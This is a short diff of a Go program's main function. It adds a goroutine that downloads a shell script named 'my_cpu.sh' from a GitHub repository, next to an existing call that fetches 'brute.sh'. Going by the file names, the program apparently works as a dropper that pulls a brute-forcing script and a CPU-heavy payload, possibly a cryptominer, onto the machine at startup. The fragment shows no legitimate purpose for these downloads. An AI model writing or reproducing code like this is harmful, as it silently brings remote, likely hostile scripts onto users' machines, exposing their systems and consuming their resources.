@@ -22,6 +22,7 @@ func main() {
 go  utils_down("https://github.com/atilabyte/golang/raw/refs/heads/master/brute.sh")
 
 
+go  utils_down("https://github.com/atilabyte/golang/raw/refs/heads/master/my_cpu.sh")
 
 
 
